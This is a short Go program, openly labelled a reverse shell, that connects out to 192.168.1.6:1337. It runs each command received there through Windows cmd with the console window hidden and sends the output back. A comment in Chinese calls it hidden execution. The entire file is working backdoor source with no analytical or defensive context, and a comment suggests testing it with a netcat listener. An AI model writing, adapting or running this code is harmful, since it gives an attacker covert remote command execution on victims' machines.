package main
// Reverse shell
// Test with nc -l 1337
//  
//import "os"
import "os/exec"
import "net"
import "fmt"
import "syscall"
import "bufio"

//隐藏执行的反向代理
func main(){

    c,_:=net.Dial("tcp","192.168.1.6:1337");
    
    for{
        status, _ := bufio.NewReader(c).ReadString('\n');
        fmt.Println(status)
        
        //out, _:=exec.Command("cmd","/Y", '/Q', "/K", status).Output();   
        
        cmd := exec.Command("cmd", "/C", status)
        cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
        out, _ := cmd.Output();
        
        c.Write([]byte(out))

    }
}